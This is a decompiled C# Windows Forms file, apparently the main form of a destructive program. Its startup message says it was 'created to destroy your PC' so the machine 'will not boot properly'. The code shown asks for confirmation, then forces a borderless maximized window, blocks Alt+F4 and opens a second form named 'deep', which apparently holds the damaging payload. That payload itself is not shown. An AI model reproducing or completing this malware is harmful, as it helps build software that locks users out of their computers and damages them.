using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

// Token: 0x02000003 RID: 3
public partial class main : Form
{
	// Token: 0x06000047 RID: 71
	[DllImport("user32.dll")]
	private static extern bool SetCursorPos(int int_0, int int_1);

	// Token: 0x06000048 RID: 72 RVA: 0x00003388 File Offset: 0x00001588
	public main()
	{
		this.InitializeComponent();
		DialogResult dialogResult = main.smethod_0("Does it really start? This software was created to destroy your PC. If you run it, your PC will not boot properly. Running this software is at your own risk. Do you really want to run this software? No kidding.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2);
		if (dialogResult != DialogResult.Yes)
		{
			if (dialogResult == DialogResult.No)
			{
				main.smethod_1();
				main.smethod_2(this);
				main.smethod_3(0);
			}
		}
		main.smethod_4(this, FormBorderStyle.None);
		main.smethod_5(this, FormWindowState.Maximized);
	}

	// Token: 0x06000049 RID: 73 RVA: 0x000022DC File Offset: 0x000004DC
	private void main_Load(object sender, EventArgs e)
	{
		main.smethod_6(new deep());
	}

	// Token: 0x0600004A RID: 74 RVA: 0x00003064 File Offset: 0x00001264
	protected virtual void WndProc(ref Message m)
	{
		if (m.Msg == 260)
		{
			if (m.WParam.ToInt32() == 115)
			{
				m.Result = IntPtr.Zero;
				return;
			}
		}
		base.WndProc(ref m);
	}

	// Token: 0x0600004B RID: 75 RVA: 0x000022E8 File Offset: 0x000004E8
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			main.smethod_7(this.icontainer_0);
		}
		base.Dispose(disposing);
	}

	// Token: 0x0600004D RID: 77 RVA: 0x00002307 File Offset: 0x00000507
	static DialogResult smethod_0(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0, MessageBoxDefaultButton messageBoxDefaultButton_0)
	{
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0, messageBoxDefaultButton_0);
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00002314 File Offset: 0x00000514
	static void smethod_1()
	{
		Application.Exit();
	}

	// Token: 0x0600004F RID: 79 RVA: 0x0000231B File Offset: 0x0000051B
	static void smethod_2(Form form_0)
	{
		form_0.Close();
	}

	// Token: 0x06000050 RID: 80 RVA: 0x00002323 File Offset: 0x00000523
	static void smethod_3(int int_0)
	{
		Environment.Exit(int_0);
	}

	// Token: 0x06000051 RID: 81 RVA: 0x0000232B File Offset: 0x0000052B
	static void smethod_4(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		form_0.FormBorderStyle = formBorderStyle_0;
	}

	// Token: 0x06000052 RID: 82 RVA: 0x00002334 File Offset: 0x00000534
	static void smethod_5(Form form_0, FormWindowState formWindowState_0)
	{
		form_0.WindowState = formWindowState_0;
	}

	// Token: 0x06000053 RID: 83 RVA: 0x000022A5 File Offset: 0x000004A5
	static void smethod_6(Control control_0)
	{
		control_0.Show();
	}

	// Token: 0x06000054 RID: 84 RVA: 0x000021FC File Offset: 0x000003FC
	static void smethod_7(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	// Token: 0x06000055 RID: 85 RVA: 0x000022CB File Offset: 0x000004CB
	static void smethod_8(Control control_0)
	{
		control_0.SuspendLayout();
	}

	// Token: 0x04000009 RID: 9
	private IContainer icontainer_0;
}
